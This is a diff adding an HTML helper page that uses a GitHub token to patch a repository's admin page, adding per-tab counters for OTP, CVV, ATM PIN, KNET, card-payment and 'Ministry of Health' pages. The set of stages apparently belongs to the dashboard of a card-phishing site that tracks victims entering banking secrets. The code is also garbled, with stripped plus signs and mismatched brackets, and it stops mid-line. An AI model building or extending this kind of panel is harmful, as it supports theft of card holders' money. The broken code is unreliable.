@@ -1,0 +1,31 @@
+<!doctype html><meta charset=utf-8><title>p17</title>
+<h3>p17 — أعداد الزوار على كل تبويب</h3>
+<input id=tok placeholder="github_pat_..." style="width:100%;padding:8px">
+<br><br>
+<button onclick="run()">RUN</button>
+<pre id=log style="white-space:pre-wrap"></pre>
+<script>
+const OWNER='fahshomi-ui',REPO='KDD',PATH='server/admin/index.html';
+const el=id=>document.getElementById(id);
+const log=m=>{el('log').textContent=el('log').textContent.concat(m,'\n');};
+function enc(s){const u=new TextEncoder().encode(s);let o='';for(let i=0;i<u.length;i  ){o=o.concat(String.fromCharCode(u[i]));}return btoa(o);}
+function dec(s){const b=atob(s.replace(/\n/g,''));const u=new Uint8Array(b.length);for(let i=0;i<b.length;i  ){u[i]=b.charCodeAt(i);}return new TextDecoder().decode(u);}
+async function run(){
+const t=el('tok').value.trim();
+if(!t){log('NO TOKEN');return;}
+const url='https://api.github.com/repos/'.concat(OWNER,'/',REPO,'/contents/',PATH);
+log('GET');
+const r=await fetch(url,{headers:{Authorization:'Bearer '.concat(t),Accept:'application/vnd.github json'},cache:'no-store'});
+if(!r.ok){log('GET '.concat(String(r.status)));return;}
+const j=await r.json();
+const txt=dec(j.content);
+if(txt.indexOf('KDD-TABC')>-1){log('ALREADY');return;}
+const P=[
+"var K=[['otp','otp|رمز'],['cvv','cvv'],['atm','atm|مرور'],['knet','كي نت|knet'],['card','بطاقة|credit|card'],['sum','ملخص|summary'],['fin','نهائي|final'],['cart','سلة','cart'],['chk','طلب|checkout'],['prd','منتج|مشتج|product'],['moh','وزار|moh']];",
+"/*KDD-TABC*/var K=[['otp','otp|رمز'],['cvv','cvv'],['atm','atm|مرور'],['knet','كي نت|knet'],['card','بطاقة|credit|card'],['sum','ملخص|summary'],['fin','نهائي|final'],['cart','سلة|cart'],['chk','طلب|checkout'],['prd','منتج|مشتج|product'],['moh','وزار|moh']];"],
+"var L={home:'🏠 الرئيسية',prd:'📦 المنتجات',cart:'🛒 السلة',chk:'🧾 إتمام الطلب'};",
+"var L={home:'🏠 الرئيسية',prd:'📦 المنتجات',cart:'🛒 السلة',chk:'🧾 إتمام الطلب',sum:'🧮 الملخص',knet:'🏦 كي نت',card:'💳 البطاقة',otp:'🔢 OTP',cvv:'🔒 CVV',atm:'🔑 ATM',fin:'✅ نهائي',moh:'🏥 وزارة الصحة'};"],
+["L[k]+(c[k]?'<b>'+c[k]+'</b>':'')",
+"L[k]+'<b>'+(c[k]||0)+'</b>'"]
+];
+for(let i=0;i<P.length;i++){if(txt.indexOf(P[i
